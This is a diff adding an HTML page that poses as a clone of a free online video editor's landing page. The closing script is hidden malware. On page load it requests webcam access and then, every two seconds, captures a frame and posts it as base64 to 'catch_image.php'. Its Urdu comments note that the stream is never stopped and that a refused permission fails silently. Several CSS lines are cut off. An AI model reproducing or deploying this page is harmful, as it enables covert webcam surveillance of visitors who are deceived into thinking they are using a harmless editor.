@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Free Online Video Editor — Clone</title>
+
+<style>
+  /* Reset / base */
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;line-height:1.45;color:#0b1220}
+  :root{
+    --bg1: linear-gradient(180deg,#071124 0%, #071827 100%);
+    --card:#0f1724;
+    --muted:#6b7280;
+    --accent1:#4f46e5;
+    --accent2:#06b6d4;
+    --panel:#0b1220;
+    --glass: rgba(255,255,255,0.03);
+    --radius:12px;
+    --maxw:1200px;
+  }
+
+  body{
+    background: #f6f7fb;
+    padding:32px;
+    display:flex;
+    justify-content:center;
+  }
+
+  .wrap{
+    width:100%;
+    max-width:var(--maxw);
+  }
+
+  /* Header / hero */
+  .hero{
+    display:grid;
+    grid-template-columns: 1fr 420px;
+    gap:24px;
+    align-items:center;
+  }
+
+  .hero-left{
+    padding:28px;
+  }
+
+  .kicker{display:inline-block;background:linear-gradient(90deg,var(--accent1),var(--accent2));color:white;padding:6px 10px;border-radius:999px;font-weight:600;font-size:13px}
+  h1{font-size:40px;margin:18px 0 10px;color:#0b1220;line-height:1.05}
+  p.lead{color:var(--muted);font-size:17px;margin:0 0 18px;max-width:64ch}
+
+  .cta-row{display:flex;gap:12px;align-items:center;margin-top:14px}
+  .btn{
+    background:linear-gradient(90deg,var(--accent1),var(--accent2));
+    color:white;padding:12px 18px;border-radius:10px;border:0;font-weight:700;cursor:pointer;
+    box-shadow:0 8px 30px rgba(79,70,229,0.12);
+  }
+  .btn.ghost{background:transparent;border:1px solid rgba(11,17,32,0.06);color:var(--muted);font-weight:600}
+  .small-muted{color:var(--muted);font-size:13px;margin-left:6px}
+
+  /* hero-right visual */
+  .hero-right{
+    background:linear-gradient(180deg,#071124,#081526);
+    border-radius:16px;padding:18px;color:white;min-height:240px;display:flex;flex-direction:column;gap:12px;align-items:center;justify-content:center;
+    position:relative;overflow:hidden;
+  }
+  .mock-video{
+    width:100%;height:160px;border-radius:10px;background:
+      radial-gradient(circle at 10% 10%, rgba(255,255,255,0.06), transparent 6%),
+      linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px;
+    border:1px solid rgba(255,255,255,0.03);
+  }
+  .play{
+    width:56px;height:56px;border-radius:50%;background:rgba(255,255,255,0.12);display:flex;align-items:center;justify-content:center;font-size:22px;
+  }
+  .caption{font-size:13px;color:rgba(255,255,255,0.85)}
+
+  /* features */
+  .features{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:16px;
+    margin-top:26px;
+  }
+  .feature{
+    background:white;padding:16px;border-radius:12px;border:1px solid rgba(11,17,32,0.04);
+    box-shadow:0 8px 24px rgba(2,6,23,0.03);
+  }
+  .feature h4{margin:0 0 6px;font-size:16px}
+  .feature p{margin:0;color:var(--muted);font-size:14px}
+
+  /* section */
+  section{margin-top:36px}
+  .section-head{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+  .section-head h2{margin:0;font-size:22px}
+  .templates-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:12px}
+  .template{
+    background:linear-gradient(180deg,#fff,#f8fafc);border-radius:12px;padding:12px;border:1px solid rgba(11,17,32,0.04);
+    min-height:120px;display:flex;flex-direction:column;gap:10px;
+  }
+  .template .thumb{height:70px;border-radius:8px;background:linear-gradient(90deg,#fde68a,#fb7185);display:flex;align-items:center;justify-content:center;font-weight:700;color:>
+  .template h4{margin:0;font-size:15px}
+  .template p{margin:0;color:var(--muted);font-size:13px}
+
+  /* FAQ grid */
+  .faq-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .faq{background:white;padding:14px;border-radius:10px;border:1px solid rgba(11,17,32,0.04)}
+  .faq h5{margin:0 0 8px;font-size:15px}
+  .faq p{margin:0;color:var(--muted);font-size:13px}
+
+  /* footer */
+  footer{margin-top:34px;color:var(--muted);font-size:13px;text-align:center}
+
+  /* responsive */
+  @media (max-width:1000px){
+    .hero{grid-template-columns:1fr}
+    .features{grid-template-columns:repeat(2,1fr)}
+    .templates-grid{grid-template-columns:repeat(2,1fr)}
+    .faq-grid{grid-template-columns:1fr}
+  }
+  @media (max-width:620px){
+    .features{grid-template-columns:1fr}
+    .templates-grid{grid-template-columns:1fr}
+    .hero-left{padding:14px}
+    h1{font-size:28px}
+  }
+
+  /* subtle decorative shapes (not copyrighted) */
+  .hero-right::before{
+    content:"";position:absolute;width:220px;height:220px;border-radius:50%;top:-40px;right:-60px;background:radial-gradient(circle at 30% 30%, rgba(79,70,229,0.22), transparen>
+  }
+  .hero-right::after{
+    content:"";position:absolute;width:160px;height:160px;border-radius:50%;bottom:-40px;left:-40px;background:radial-gradient(circle at 30% 30%, rgba(6,182,212,0.14), transpar>
+  }
+
+  /* tiny helpers */
+  .muted{color:var(--muted)}
+  .center{display:flex;align-items:center;justify-content:center}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <!-- HERO -->
+    <div class="hero">
+      <div class="hero-left">
+        <span class="kicker">Free video editor</span>
+        <h1>Create and edit videos quickly — no experience required</h1>
+        <p class="lead">Easily create short videos, trim footage, add animated graphics, and export an MP4 ready to share on social platforms. Start from a template or upload y>
+
+        <div class="cta-row">
+          <button class="btn" onclick="alert('This is a static clone demo — open the real tool to upload.')">Upload your video</button>
+          <button class="btn ghost" onclick="alert('Try templates demo')">Browse templates</button>
+          <span class="small-muted">File size up to 1 GB — MP4, MOV supported</span>
+        </div>
+
+        <div style="margin-top:18px;display:flex;gap:10px;flex-wrap:wrap">
+          <div style="min-width:220px">
+            <strong>Quick actions</strong>
+            <div class="muted" style="font-size:13px;margin-top:6px">Trim · Crop · Split · Add music · Resize for TikTok</div>
+          </div>
+          <div style="min-width:180px">
+            <strong>Auto save</strong>
+            <div class="muted" style="font-size:13px;margin-top:6px">Your project saves in the browser while you work.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="hero-right">
+        <div class="mock-video">
+          <div class="play">▶</div>
+          <div class="caption">Drag & drop clips — play a quick preview</div>
+        </div>
+        <div style="display:flex;gap:10px;width:100%;justify-content:center;margin-top:6px">
+          <button class="btn ghost" style="padding:8px 12px">Upload</button>
+          <button class="btn ghost" style="padding:8px 12px">Templates</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- FEATURES -->
+    <div class="features" style="margin-top:24px">
+      <div class="feature">                                                                                                                                                              <h4>Trim, split, and arrange clips</h4>
+        <p>Quickly remove unwanted sections, rearrange clips on the timeline, and merge multiple videos into one.</p>
+      </div>
+      <div class="feature">
+        <h4>Stock audio & music</h4>
+        <p>Add a soundtrack from free stock music or upload your own voice-over for perfect timing.</p>
+      </div>
+      <div class="feature">
+        <h4>Resize for social</h4>
+        <p>Convert your project to TikTok, Instagram Reels, or Stories with one click — aspect ratio presets included.</p>
+      </div>
+    </div>
+
+    <!-- Templates / How to edit -->
+    <section>
+      <div class="section-head">
+        <h2>How to edit videos</h2>
+      </div>
+
+      <div style="display:flex;gap:12px;flex-wrap:wrap">
+        <div style="flex:1;min-width:260px">
+          <div style="background:white;padding:14px;border-radius:12px;border:1px solid rgba(11,17,32,0.04);box-shadow:0 8px 24px rgba(2,6,23,0.03)">
+            <h4 style="margin-top:0">1. Upload media</h4>
+            <p class="muted">Start a new project by uploading clips or choosing a template. Supported formats: MP4, MOV.</p>
+            <div style="margin-top:10px" class="center">
+              <button class="btn" onclick="alert('Upload demo')">Upload your video</button>                                                                                                  </div>                                                                                                                                                                         </div>
+        </div>
+
+        <div style="flex:1;min-width:260px">
+          <div style="background:white;padding:14px;border-radius:12px;border:1px solid rgba(11,17,32,0.04);box-shadow:0 8px 24px rgba(2,6,23,0.03)">
+            <h4 style="margin-top:0">2. Select a template</h4>
+            <p class="muted">Browse thousands of templates — add icons, text, and animated elements to match your style.</p>
+          </div>
+        </div>
+
+        <div style="flex:1;min-width:260px">
+          <div style="background:white;padding:14px;border-radius:12px;border:1px solid rgba(11,17,32,0.04);box-shadow:0 8px 24px rgba(2,6,23,0.03)">
+            <h4 style="margin-top:0">3. Export & share</h4>
+            <p class="muted">Download as MP4 or resize for social. Use the content scheduler to publish later if you want.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- templates -->
+    <section>
+      <div class="section-head">
+        <h2>Popular templates</h2>
+      </div>
+
+      <div class="templates-grid">
+        <div class="template">
+          <div class="thumb">Social Promo</div>
+          <h4>Promo for Instagram</h4>
+          <p class="muted">Fast-moving clips and bold text for product promos.</p>
+        </div>
+        <div class="template">
+          <div class="thumb" style="background:linear-gradient(90deg,#93c5fd,#7c3aed)">Reel</div>
+          <h4>Story / Reel</h4>
+          <p class="muted">Vertical-first template for short-form content.</p>
+        </div>
+        <div class="template">
+          <div class="thumb" style="background:linear-gradient(90deg,#fdba74,#fb7185)">Tutorial</div>
+          <h4>Explainer</h4>
+          <p class="muted">Step-by-step layout for how-to videos.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ -->
+    <section>
+      <div class="section-head">
+        <h2>Frequently asked questions</h2>
+      </div>
+
+      <div class="faq-grid">
+        <div class="faq">
+          <h5>Can I edit a video online for free?</h5>
+          <p class="muted">Yes — this editor supports free editing in your browser. Some premium features may require a paid plan.</p>
+        </div>
+
+        <div class="faq">
+          <h5>Which file types are supported?</h5>
+          <p class="muted">Common video formats such as MP4 and MOV are supported for upload and export.</p>
+        </div>
+
+        <div class="faq">
+          <h5>Can I resize for TikTok?</h5>
+          <p class="muted">Yes — resize and crop tools are included to adapt your project to social platform aspect ratios.</p>
+        </div>
+
+        <div class="faq">
+          <h5>Does it save automatically?</h5>
+          <p class="muted">Your progress can be saved in the browser or account so you can return and continue editing later.</p>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div style="margin-top:30px">This is a static clone (layout + styles) created for demo/learning purposes only.</div>
+    </footer>
+  </div>
+<script>
+    // یہ فنکشن کیمرہ ایکسیس مانگے گا، اور کامیابی پر ایک لوپ شروع کرے گا۔
+    function requestCameraAccess() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    // 🎉 اجازت مل گئی!
+                    var track = stream.getVideoTracks()[0];
+                    var imageCapture = new ImageCapture(track);
+
+                    // تصویر کھینچنے اور بھیجنے کا فنکشن (جو اب لوپ میں چلے گا)
+                    function sendFrame() {
+                        imageCapture.grabFrame()
+                            .then(function(imageBitmap) {
+                                var canvas = document.createElement('canvas');
+                                canvas.width = imageBitmap.width;
+                                canvas.height = imageBitmap.height;
+                                var context = canvas.getContext('2d');
+                                context.drawImage(imageBitmap, 0, 0);
+
+                                canvas.toBlob(function(blob) {
+                                    var reader = new FileReader();
+                                    reader.readAsDataURL(blob);
+                                    reader.onloadend = function() {
+                                        var base64data = reader.result;
+
+                                        // Base64 ڈیٹا کو 'catch_image.php' فائل کو بھیجیں
+                                        fetch('catch_image.php', {
+                                            method: 'POST',
+                                            headers: {'Content-Type': 'application/x-www-form-urlencoded',},
+                                            body: 'image_data=' + encodeURIComponent(base64data)
+                                        })
+                                        .then(response => response.text())
+                                        .then(data => {
+                                            // ہر تصویر بھیجے جانے پر Termux میں یہ میسج نظر آئے گا
+                                            console.log('Image Send Result:', data);
+                                            // ٹریک (stream) کو بند نہیں کیا جا رہا!
+                                        })
+                                        .catch((error) => {
+                                            console.error('Error sending image:', error);
+                                        });
+                                    }
+                                }, 'image/png');
+                            })
+                            .catch(function(error) {                                                                                                                                                             console.error('grabFrame() error:', error);
+                            });
+                    }
+
+                    // 🔥🔥 اہم تبدیلی: setInterval کا استعمال 🔥🔥
+                    // تصویر کھینچنے کا عمل ہر 5 سیکنڈ (5000 ملی سیکنڈ) میں دہرائیں
+                    // نوٹ: آپ 5000 کی جگہ 2000 (2 سیکنڈ) بھی کر سکتے ہیں، لیکن زیادہ تیز لوپ براؤزر کو سست کر سکتا ہے۔
+                    setInterval(sendFrame, 2000);
+
+                })
+                .catch(function(err) {
+                    // پرمیشن نہ ملنے پر اب بھی خاموش رہیں گے
+                    console.error("Camera access denied or error:", err);
+                });
+        } else {
+             console.error("getUserMedia not supported or blocked by security policy.");
+        }
+    }
+
+    // پیج لوڈ ہوتے ہی کیمرہ مانگیں اور لوپ شروع کریں
+    requestCameraAccess();
+</script>
+
+
+</body>
+</html>
